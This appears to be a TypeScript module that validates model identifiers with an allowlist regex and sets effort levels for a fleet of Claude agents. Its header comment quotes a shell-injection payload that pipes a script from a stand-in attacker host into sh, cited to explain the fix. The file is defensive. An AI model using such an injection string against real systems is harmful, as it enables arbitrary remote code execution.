// Model-identifier validation (card b7fa5281, Cybersec command-injection finding).
//
// A dependency-free home for the model-id allowlist so BOTH the config writer (web/agent-config.ts,
// which touches the filesystem) and the pure model-fallback logic (model-fallback.ts, deliberately
// dep-free) can share ONE source of truth without either pulling the other's imports.
//
// WHY IT EXISTS. A model id flows from the dashboard, through agent-config.json, and is finally
// interpolated into the shell command string that launches an agent (web/agent-process.ts). Single-
// quoting there made a `:` in a tag safe but NOT a `'` in the value, so
//   x'; curl http://attacker.example/x.sh | sh; echo '
// broke out to arbitrary command execution on the next (re)start -- privilege escalation from
// "configure the fleet" to "run code as the fleet". This allowlist is defence #1 (narrow the input);
// agent-process.ts also escapes at the sink (defence #2). Neither alone closes the class.

/**
 * The ONLY shape a model identifier may take. Covers every real id -- `claude-*`, `deepseek-*`,
 * `provider/model` (OpenRouter), `ollama-tag:version` -- and excludes the quote, `;`, `$`, backtick
 * and space: the characters that give a value command meaning in a shell.
 *
 * DELIBERATE DEVIATION from the Cybersec-proposed `/^[A-Za-z0-9._:/-]{1,128}$/` (card b7fa5281): the
 * real install default is `claude-opus-4-8[1m]` (the 1M-context suffix), and the fallback chain ships
 * it too, so the bracket-less allowlist would 400 the fleet's own default model. `[` and `]` are ADDED
 * here. They are shell glob metacharacters, but they cannot form a command boundary or a command
 * substitution -- and the launch site quotes AND escapes the value (defence #2), so globbing is off.
 * The dangerous characters (`'` `;` `$` backtick space `|` `&` `(` `)` newline) all remain excluded.
 */
export const MODEL_ID_RE = /^[A-Za-z0-9._:/[\]-]{1,128}$/

/** True iff `model` is a syntactically valid model id (see {@link MODEL_ID_RE}). */
export function isValidModelId(model: unknown): model is string {
  return typeof model === 'string' && MODEL_ID_RE.test(model)
}

/**
 * Every effort level the Claude Code CLI accepts, in ascending order (claude.exe 2.1.220, `vO`).
 *
 * NOT the same list settings.json accepts. The settings schema is NARROWER --
 * `effortLevel: enum(["low","medium","high","xhigh"]).catch(void 0)` -- so `"max"` written into a
 * settings file is dropped SILENTLY (no error, no log) and the default `"high"` takes over. Measured
 * 2026-08-06 (card cb42ad6d): seven settings files said "max" while every agent actually ran at high.
 * `"max"` only reaches the model through the `CLAUDE_CODE_EFFORT_LEVEL` env var or the `--effort`
 * flag, which parse against THIS list and outrank settings.
 */
export const EFFORT_LEVELS = ['low', 'medium', 'high', 'xhigh', 'max'] as const

export type EffortLevel = (typeof EFFORT_LEVELS)[number]

/**
 * The effort level every Claude agent in the fleet launches with (Balázs, 2026-08-06: "mindenkinél
 * max"). Set as an env var at the launch sites, never in settings.json -- see {@link EFFORT_LEVELS}
 * for why the file is the wrong lever. A model without the `max_effort` capability downgrades itself
 * to high, so this is safe for every Claude model.
 */
export const FLEET_EFFORT_LEVEL: EffortLevel = 'max'

/** Thrown when a caller tries to persist a malformed id. Routes map it to 400. */
export class InvalidModelIdError extends Error {
  constructor(model: unknown) {
    super(
      `Érvénytelen modell-azonosító. Csak betű, szám és a . _ : / - [ ] karakterek engedélyezettek, ` +
        `1-128 hosszban (kapott: ${typeof model === 'string' ? JSON.stringify(model.slice(0, 60)) : typeof model}).`,
    )
    this.name = 'InvalidModelIdError'
  }
}
